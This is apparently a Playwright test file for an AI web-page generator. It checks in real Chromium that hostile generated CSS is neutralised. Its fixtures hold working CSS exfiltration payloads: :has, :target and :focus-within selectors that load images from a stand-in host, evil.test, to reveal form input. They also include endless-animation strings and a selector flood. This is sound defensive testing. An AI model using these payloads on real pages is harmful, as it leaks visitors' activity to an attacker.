// What a hostile generation can do to a visitor, in real Chromium. Each page goes
// through the real validateGeneration and the published render, every request is
// caught, and the payloads are the ones the review of pull request 258 proved. It
// counts for no row, on purpose: a failure stops the score, it does not lower it.

import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { chromium, type Browser, type BrowserContextOptions, type Page } from 'playwright';
import type { ComponentNode } from '@/lib/renderer/publish/hydrateBindings';
import { deriveBreakpointKeys } from '@/lib/ai/pageGen/schema';
import { REDUCED_MOTION_GATE } from '@/lib/ai/pageGen/promptSections/rules';
import { addressesHeldBy, validateGeneration } from '@/lib/ai/pageGen/validate';
import { HOVER_GATE } from '@/lib/rules/states';
import { BREAKPOINTS, publishedDocument, renderPublished } from './lib/published';

const context = {
  breakpoints: deriveBreakpointKeys(BREAKPOINTS.map(({ label, minWidth }) => ({ label, minWidth }))),
};

function generate(nodes: unknown[]) {
  const out = validateGeneration({ nodes }, context);
  if (!out.ok) throw new Error(out.errors.join('; '));
  return out.result;
}

const documentOf = (nodes: unknown[], extra = ''): string => {
  const root = { id: 'root', type: 'div', props: {}, children: nodes } as unknown as ComponentNode;
  const page = renderPublished(root);
  return publishedDocument({ ...page, html: `${extra}${page.html}` });
};

const SITE = 'https://site.test/';

interface Open {
  page: Page;
  requests: string[];
  close: () => Promise<void>;
}

let browser: Browser;

async function open(html: string, options: BrowserContextOptions = {}, hash = ''): Promise<Open> {
  const browserContext = await browser.newContext({ viewport: { width: 1280, height: 800 }, ...options });
  const requests: string[] = [];
  await browserContext.route('**/*', (route) => {
    const url = route.request().url();
    if (url.split('#')[0] === SITE) return route.fulfill({ status: 200, contentType: 'text/html', body: html });
    requests.push(url);
    return route.fulfill({ status: 200, contentType: 'image/png', body: Buffer.from('') });
  });
  const page = await browserContext.newPage();
  await page.goto(SITE + hash);
  await page.waitForTimeout(150);
  return { page, requests, close: () => browserContext.close() };
}

const hidden = (name: string) => ({ display: 'none', width: '10px', height: '10px', backgroundImage: `url(https://evil.test/c/${name})` });
const decoy = { type: 'div', props: { style: { width: '10px', height: '10px' } } };
const animationsOf = (page: Page, selector: string) =>
  page.evaluate((target) => {
    const element = document.querySelector(target);
    return (element?.getAnimations() ?? []).map((animation) => ({
      name: (animation as CSSAnimation).animationName,
      iterations: animation.effect?.getComputedTiming().iterations,
    }));
  }, selector);

describe('generated rules in Chromium', () => {
  beforeAll(async () => {
    browser = await chromium.launch();
  });
  afterAll(async () => {
    await browser.close();
  });

  it('reports nothing when a visitor starts a form, with the address in Normal', async () => {
    const { nodes } = generate([
      decoy,
      {
        type: 'div',
        props: { rules: [
          { id: 'a', selector: '&:has(input[type=checkbox]:checked) > b', style: { display: 'block' } },
          { id: 'b', selector: '&:has(input[type=email]:not(:placeholder-shown)) > u', style: { display: 'block' } },
          { id: 'c', selector: '&:is(html:has(input:checked) *)', style: { outline: '1px solid red' } },
          { id: 'd', selector: '&:has(~ * input:checked)', style: { outline: '1px solid red' } },
          // A rule that survives, so the addresses meet the second check too.
          { id: 'e', selector: '&:hover', style: { color: 'red' } },
        ] },
        children: [
          { type: 'b', props: { style: hidden('form-ticked') } },
          { type: 'u', props: { style: hidden('form-typed') } },
        ],
      },
    ]);
    const form = '<form><input type="email" placeholder="you"><input type="checkbox"></form>';
    const { page, requests, close } = await open(documentOf(nodes, form));
    await page.fill('input[type=email]', 'a@b.co');
    await page.check('input[type=checkbox]');
    await page.waitForTimeout(150);
    expect(requests.filter((url) => url.includes('evil.test'))).toEqual([]);
    await close();
  });

  it('has a control: the same form of selector does fire when nothing refuses it', async () => {
    const html = `<!doctype html><style>u{display:none;background-image:url(https://evil.test/c/control)}div:has(input:checked) u{display:block}</style><div><input type="checkbox"><u></u></div>`;
    const { page, requests, close } = await open(html);
    expect(requests).toEqual([]);
    await page.check('input[type=checkbox]');
    await page.waitForTimeout(150);
    expect(requests).toEqual(['https://evil.test/c/control']);
    await close();
  });

  it('reports nothing about the anchor a visitor arrived at', async () => {
    const { nodes } = generate([
      decoy,
      { type: 'div', props: { id: 'pricing', style: hidden('target'), rules: [{ id: 'a', selector: '&:target', style: { display: 'block' } }] } },
      { type: 'a', props: { rules: [{ id: 'h', selector: '&:hover', style: { color: 'red' } }] } },
    ]);
    const { requests, close } = await open(documentOf(nodes), {}, '#pricing');
    expect(requests.filter((url) => url.includes('evil.test'))).toEqual([]);
    await close();
  });

  it('builds no cookie wall from the consent banner', async () => {
    const { nodes } = generate([
      { type: 'h1', props: { id: 'title', children: 'Title', rules: [{ id: 'a', selector: '&:is(html:has([data-fc-consent]:not([hidden])) *)', style: { visibility: 'hidden' } }] } },
    ]);
    const { page, close } = await open(documentOf(nodes, '<div data-fc-consent>Accept</div>'));
    expect(await page.evaluate(() => getComputedStyle(document.querySelector('h1') as Element).visibility)).toBe('visible');
    await close();
  });

  it.each(['steps(2)u-m 1s', '1s"u-m"', 'cubic-bezier(0,0,1,1)u-m 1s'])('plays no stored keyframes from Normal for a reduced visitor: %s', async (animation) => {
    const { nodes } = generate([
      {
        type: 'div',
        props: {
          id: 'moving',
          style: { animation },
          rules: [{ id: 'k', define: '@keyframes u-m', blocks: [{ selector: 'to', style: { translate: '9px' } }] }],
        },
      },
    ]);
    const { page, close } = await open(documentOf(nodes), { reducedMotion: 'reduce' });
    expect(await animationsOf(page, '#moving')).toEqual([]);
    await close();
  });

  const keyframes = { id: 'k', define: '@keyframes u-m', blocks: [{ selector: 'to', style: { translate: '9px' } }] };

  it.each([
    '"linear(",u-m 1s infinite,")"',
    'u-m 1s 1000000!important',
    '"u-m"1000000 1s',
  ])('stores no endless animation: %s', async (animation) => {
    const { nodes } = generate([{ type: 'div', props: { id: 'moving', rules: [keyframes, { id: 'r', selector: '&', style: { animation } }] } }]);
    const { page, close } = await open(documentOf(nodes));
    expect(await animationsOf(page, '#moving')).toEqual([]);
    await close();
  });

  it('runs a bounded animation for a visitor with no preference, and none under reduced motion', async () => {
    const { nodes } = generate([{ type: 'div', props: { id: 'moving', rules: [keyframes, { id: 'r', selector: '&', style: { animation: 'u-m 100s 3' } }] } }]);
    expect(JSON.stringify(nodes)).toContain(REDUCED_MOTION_GATE);
    const plain = await open(documentOf(nodes));
    expect(await animationsOf(plain.page, '#moving')).toEqual([{ name: 'u-m', iterations: 3 }]);
    await plain.close();
    const reduced = await open(documentOf(nodes), { reducedMotion: 'reduce' });
    expect(await animationsOf(reduced.page, '#moving')).toEqual([]);
    await reduced.close();
  });

  const reveal = { id: 'k', define: '@keyframes u-in', blocks: [{ selector: 'to', style: { opacity: 1 } }] };

  it.each([
    ['in the rule', { rules: [reveal, { id: 'r', selector: '&', style: { opacity: 0, animation: 'u-in 100ms forwards' } }] }],
    ['in Normal', { style: { opacity: 0 }, rules: [reveal, { id: 'r', selector: '&', style: { animation: 'u-in 100ms forwards' } }] }],
    ['in another rule', { rules: [reveal, { id: 'a', selector: '&', style: { opacity: 0 } }, { id: 'r', selector: '&', style: { animation: 'u-in 100ms forwards' } }] }],
  ])('shows a reveal to everyone, with the start value %s', async (_, props) => {
    const { nodes } = generate([{ type: 'p', props: { id: 'text', children: 'Read me', ...props } }]);
    const opacity = (page: Page) => page.evaluate(() => getComputedStyle(document.querySelector('#text') as Element).opacity);
    const reduced = await open(documentOf(nodes), { reducedMotion: 'reduce' });
    await reduced.page.waitForTimeout(300);
    expect(await opacity(reduced.page)).toBe('1');
    await reduced.close();
    const plain = await open(documentOf(nodes));
    await plain.page.waitForTimeout(300);
    expect(await opacity(plain.page)).toBe('1');
    await plain.close();
  });

  it('shows no focus to a host that was only named in text', async () => {
    const held = addressesHeldBy({ type: 'section', children: [{ type: 'p', props: { children: 'Our partner page: url(https://evil.test/c/held-text).' } }] });
    const out = validateGeneration(
      {
        nodes: [
          {
            type: 'div',
            props: { rules: [{ id: 'a', selector: '&:focus-within > b', style: { display: 'block' } }] },
            children: [
              { type: 'a', props: { id: 'lnk', href: '/x', children: 'link' } },
              { type: 'b', props: { style: hidden('held-text') } },
            ],
          },
        ],
      },
      { ...context, heldAddresses: held },
    );
    if (!out.ok) throw new Error(out.errors.join('; '));
    const { page, requests, close } = await open(documentOf(out.result.nodes));
    await page.focus('#lnk');
    await page.waitForTimeout(150);
    expect(requests.filter((url) => url.includes('evil.test'))).toEqual([]);
    await close();
  });

  const boxOf = (page: Page) =>
    page.evaluate(() => {
      const element = document.querySelector('#text') as HTMLElement;
      const box = element.getBoundingClientRect();
      const style = getComputedStyle(element);
      return { width: box.width, height: box.height, opacity: style.opacity, clip: style.clipPath };
    });

  it.each([
    ['a zero scale in Normal', { style: { transform: 'scale(0)' } }, { transform: 'none' }, '&', false],
    ['a full clip in Normal', { style: { clipPath: 'inset(100%)' } }, { clipPath: 'inset(0)' }, '&', false],
    ['opacity under a list', { style: { opacity: 0 } }, { opacity: 1 }, '&, &:hover', false],
    ['opacity under a trailing space', { style: { opacity: 0 } }, { opacity: 1 }, '& ', false],
    ['a child behind a parent rule', { style: { opacity: 0 } }, { opacity: 1 }, '& > p', true],
  ])('shows %s to a reduced visitor, and reveals it for everyone else', async (_, start, to, selector, onChild) => {
    const keyframes = { id: 'k', define: '@keyframes u-in', blocks: [{ selector: 'to', style: to }] };
    const rules = [keyframes, { id: 'r', selector, style: { animation: 'u-in 100ms forwards' } }];
    const text = { id: 'text', children: 'Read me', ...start, ...(onChild ? {} : { rules }) };
    const { nodes } = generate([
      onChild
        ? { type: 'div', props: { rules }, children: [{ type: 'p', props: { ...text, style: { ...start.style, width: '100px', height: '40px' } } }] }
        : { type: 'p', props: { ...text, style: { ...start.style, width: '100px', height: '40px' } } },
    ]);
    for (const reducedMotion of ['reduce', 'no-preference'] as const) {
      const { page, close } = await open(documentOf(nodes), { reducedMotion });
      await page.waitForTimeout(300);
      const box = await boxOf(page);
      expect(box).toMatchObject({ width: 100, height: 40, opacity: '1' });
      expect(box.clip).toMatch(/^(?:none|inset\(0(?:%|px)?\))$/);
      await close();
    }
  });

  it('leaves the owner their later rule after a generation tries to spend the budget', async () => {
    const flood = Array.from({ length: 2100 }, (_, index) => `&:nth-child(${index + 1})`).join(',');
    const { nodes } = generate([{ type: 'div', props: { rules: [{ id: 'a', selector: flood, style: { color: 'red' } }] } }]);
    const owner = {
      id: 'owner',
      type: 'a',
      props: { id: 'link', href: '#', children: 'Link', rules: [{ id: 'h', selector: '&:hover', at: [HOVER_GATE], style: { color: 'rgb(0, 0, 255)' } }] },
    };
    const { page, close } = await open(documentOf([...nodes, owner]));
    await page.hover('#link');
    expect(await page.evaluate(() => getComputedStyle(document.querySelector('#link') as Element).color)).toBe('rgb(0, 0, 255)');
    await close();
  });

  it('keeps a taught hover working', async () => {
    const { nodes } = generate([
      { type: 'a', props: { id: 'link', href: '#', children: 'Link', rules: [{ id: 'h', selector: '&:hover', at: [HOVER_GATE], style: { color: 'rgb(0, 0, 255)' } }] } },
    ]);
    const { page, close } = await open(documentOf(nodes));
    await page.hover('#link');
    expect(await page.evaluate(() => getComputedStyle(document.querySelector('#link') as Element).color)).toBe('rgb(0, 0, 255)');
    await close();
  });
});
